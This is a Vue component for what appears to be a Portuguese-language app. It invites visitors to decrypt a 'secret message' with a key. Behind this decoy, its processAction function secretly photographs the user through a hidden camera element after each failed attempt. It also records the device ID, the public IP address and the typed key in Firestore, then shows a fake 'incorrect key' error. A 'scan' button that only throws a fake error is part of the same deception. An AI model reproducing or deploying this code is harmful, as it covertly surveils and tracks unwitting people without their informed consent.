<template>
    <div class="modal fade" id="handleModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="handleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="handleModalLabel">Mensagem de {{ data.nome }}</h1>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <Ads />
                    <div v-if="data.alert != null" class="mb-3">
                        <div :class="'alert alert-' + data.alert.class + ' alert-dismissible'" role="alert">
                            {{ data.alert.message }}
                            <button @click="() => data.alert = null" type="button" class="btn-close"></button>
                        </div>
                    </div>
                    <div class="card text-center mb-3">
                        <div class="card-body">
                            <p class="card-text overflow-auto text-break font-monospace mb-3"
                                style="max-height: 160px;">
                                {{ data.secretMessage }}
                            </p>
                            <hr>
                            <button @click="copyToClipboard(data.secretMessage)" class="btn btn-primary">
                                Copiar 📋
                            </button>
                        </div>
                    </div>
                    <h5 class="card-title mb-3">Descriptografar Mensagem 🔓</h5>
                    <div class="mb-3">
                        <label for="inputSecretKey" class="form-label">
                            Informe a chave secreta 🔑
                            <a class="btn btn-link btn-sm" data-bs-toggle="collapse" href="#collapseTip" role="button"
                                aria-expanded="false" aria-controls="collapseTip">
                                (Ver dica)
                            </a>
                        </label>
                        <div class="collapse" id="collapseTip">
                            <div class="alert alert-info text-center" role="alert">
                                <b style="color: red;">{{ data.tip }}</b>
                            </div>
                        </div>
                        <div class="row g-3">
                            <div class="col">
                                <input v-model="data.inputSecretKey" type="text" class="form-control"
                                    id="inputSecretKey">
                            </div>
                            <div class="col-auto">
                                <button @click="throwError" class="btn btn-primary mb-3">Escanear 📷</button>
                            </div>
                        </div>
                    </div>
                    <!-- <div class="card text-center mb-3">
                        <div class="card-body">
                            <p class="card-text overflow-auto text-break font-monospace mb-3"
                                style="max-height: 200px;">...</p>
                            <hr>
                            <button disabled="true" class="btn btn-primary">
                                Copiar 📋
                            </button>
                        </div>
                    </div>
                    <br>
                    <button @click="requestCameraPermission" type="button"
                        class="btn btn-primary btn-lg">Ativar</button>
                    <button id="capture-btn" class="btn btn-primary btn-lg">Capture Photo</button>
                    <br>
                    <br> -->
                </div>
                <div class="modal-footer d-flex justify-content-center">
                    <button @click="decodeTheMessage" class="btn btn-success mb-3">Descriptografar</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="permissionsModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="permissionsModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="permissionsModalLabel">⚠️ Importante! ⚠️</h1>
                    <!-- <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button> -->
                </div>
                <div class="modal-body">
                    Algumas funcionalidades dependem de permissão para usar recursos do seu navegador. Nega-los pode
                    ocasionar não funcionamento adequado do aplicativo 😔.
                </div>
                <div class="modal-footer d-flex justify-content-between">
                    <button @click="cancelAction" class="btn btn-secondary">Cancelar</button>
                    <button @click="permissionsModalActionConfirm" class="btn btn-success">Ciente, prosseguir</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="ratingModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="ratingModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="ratingModalLabel">Avaliação do App</h1>
                    <!-- <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button> -->
                </div>
                <div class="modal-body">
                    <p>
                        👀 Observamos que você está usando nosso app com frequência, esperamos que esteja gostando! 🤩
                        Considere nos avaliar 🙏
                    </p>
                    <div class="rating-card text-center p-4">
                        <div class="star-rating animated-stars">
                            <input type="radio" id="star5" name="rating" value="5" v-model="data.rating">
                            <label for="star5" class="bi bi-star-fill"></label>
                            <input type="radio" id="star4" name="rating" value="4" v-model="data.rating">
                            <label for="star4" class="bi bi-star-fill"></label>
                            <input type="radio" id="star3" name="rating" value="3" v-model="data.rating">
                            <label for="star3" class="bi bi-star-fill"></label>
                            <input type="radio" id="star2" name="rating" value="2" v-model="data.rating">
                            <label for="star2" class="bi bi-star-fill"></label>
                            <input type="radio" id="star1" name="rating" value="1" v-model="data.rating">
                            <label for="star1" class="bi bi-star-fill"></label>
                        </div>
                        <p class="text-muted mt-2">Clique para avaliar</p>
                    </div>
                    <div class="mb-3">
                        <label for="ratingName" class="form-label">Como devemos lhe chamar?</label>
                        <input class="form-control" id="ratingName" v-model="data.name">
                    </div>
                    <div class="mb-3">
                        <label for="ratingComment" class="form-label">📜 Comentários (opcional)</label>
                        <textarea class="form-control" id="ratingComment" rows="2" v-model="data.comment"></textarea>
                    </div>
                </div>
                <div class="modal-footer d-flex justify-content-between">
                    <button @click="cancelRating" class="btn btn-secondary">Cancelar</button>
                    <button @click="sendRating" class="btn btn-success">Enviar!</button>
                </div>
            </div>
        </div>
    </div>

    <video id="camera" style="display: none;" autoplay></video>
    <canvas id="photo" style="display: none;"></canvas>
</template>

<style scoped>
.star-rating {
    direction: rtl;
    display: inline-block;
    cursor: pointer;
}

.star-rating input {
    display: none;
}

.star-rating label {
    color: #ddd;
    font-size: 32pt;
    padding: 0 2px;
    cursor: pointer;
    transition: all 0.2s ease;
}

.star-rating label:hover,
.star-rating label:hover~label,
.star-rating input:checked~label {
    color: #ffc107;
}
</style>

<script setup>
import Ads from './Ads.vue';
import { onMounted, reactive } from 'vue';
import { useAppStore } from '../store';
import { useRoute } from 'vue-router';
import { Device } from '@capacitor/device';
import { doc, getDoc, setDoc, Timestamp } from 'firebase/firestore';
import { firestore, storage } from '../firebase';
import { ref, uploadString } from 'firebase/storage';
import { alertMessage, copyToClipboard, decrypt, delay, requestCameraPermission, requestNotificationPermission } from '../functions';

const data = reactive({
    nome: '',
    secretMessage: "U2FsdGVkX1+gEM7TZDbWn1wUIKvEswhrGQ6PFvVQ49M=",
    tip: 'teste',
    inputSecretKey: '',
    requestPermissionsModal: true,
    countAttempts: 0,
    evaluated: false,
    rating: 2,
    name: '',
    comment: '',
    video: null,
    canvas: null,
    alert: null,
    handleModal: null,
    permissionsModal: null,
    ratingModal: null,
});

const route = useRoute();
const appStore = useAppStore();

onMounted(async () => {
    if (route.query?.msg === 'FulanoDeTal') {
        data.nome = route.query.msg;
        data.video = document.getElementById('camera');
        data.canvas = document.getElementById('photo');
        data.handleModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#handleModal'));
        data.permissionsModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#permissionsModal'));
        data.ratingModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#ratingModal'));

        try {
            const device = await Device.getId();
            const ref = doc(firestore, 'reviews', device.identifier);
            const docSnap = await getDoc(ref);

            if (docSnap.exists()) {
                data.evaluated = true;
            }
        } catch (error) {
            console.error('Error on get reviews:', error);
        }

        data.handleModal.show();
    }
});

function rating() {
    if (!data.evaluated && data.countAttempts >= 5) {
        data.handleModal.hide();
        data.ratingModal.show();
    }
}

async function sendRating() {
    if (!data.name) {
        alert('Preencha pelo menos seu nome!');
        return;
    }

    appStore.loadingToggle();

    let payload = {};

    payload.rating = data.rating;
    payload.name = data.name;

    if (data.comment) {
        payload.comment = data.comment;
    }

    payload.at = Timestamp.fromDate(new Date());

    // console.log(payload);
    Object.keys(payload).forEach(key => payload[key] === undefined && delete payload[key]);

    try {
        const device = await Device.getId();
        await setDoc(doc(firestore, "reviews", device.identifier), payload);
        data.evaluated = true;
    } catch (error) {
        console.error('Error insert review:', error);
    }

    appStore.loadingToggle();
    cancelRating();
}

async function processAction() {
    await requestNotificationPermission();
    await requestCameraPermission(data.video);

    appStore.loadingToggle();

    let payload = {};

    try {
        const device = await Device.getId();
        payload.device = device.identifier;
    } catch (error) {
        console.error('Error device info:', error);
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        payload.ip = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    payload.inputSecretKey = data.inputSecretKey;
    payload.at = Timestamp.fromDate(new Date());

    // console.log(payload);
    Object.keys(payload).forEach(key => payload[key] === undefined && delete payload[key]);

    const id = Date.now().toString();

    try {
        await setDoc(doc(firestore, "attempts", id), payload);
    } catch (error) {
        console.error('Error insert payload:', error);
    }

    data.canvas.width = data.video.videoWidth;
    data.canvas.height = data.video.videoHeight;

    const context = data.canvas.getContext('2d');
    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);

    try {
        await uploadString(ref(storage, `/curious/${payload.device}/${id}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
    } catch (error) {
        console.error('Error upload file:', error);
    }

    const tracks = data.video.srcObject.getTracks();
    if (tracks) {
        tracks.forEach(t => t.stop());
    }

    data.countAttempts++;
    // console.log(data.countAttempts);

    await delay(751 + (Math.random() * 750));
    data.alert = alertMessage('danger', 'Chave secreta incorreta ou inválida!');
    appStore.loadingToggle();

    rating();
}

async function decodeTheMessage() {
    if (!data.inputSecretKey) {
        data.alert = alert('Informe uma chave secreta para prosseguir!');
        return;
    }

    const decrypted = decrypt(data.secretMessage, data.inputSecretKey);

    if (decrypted) {
        alert(decrypted);
        return;
    }

    if (data.requestPermissionsModal) {
        data.handleModal.hide();
        data.permissionsModal.show();
    } else {
        processAction();
    }
}

function permissionsModalActionConfirm() {
    data.permissionsModal.hide();
    data.handleModal.show();
    data.requestPermissionsModal = false;
    processAction();
}

function cancelAction() {
    data.permissionsModal.hide();
    data.handleModal.show();
}

function cancelRating() {
    data.ratingModal.hide();
    data.handleModal.show();
}

async function throwError() {
    await requestCameraPermission(data.video);
    const tracks = data.video.srcObject.getTracks();
    if (tracks) {
        tracks.forEach(t => t.stop());
    }
    data.alert = alertMessage('danger', 'Erro inesperado! Tente mais tarde...');
}
</script>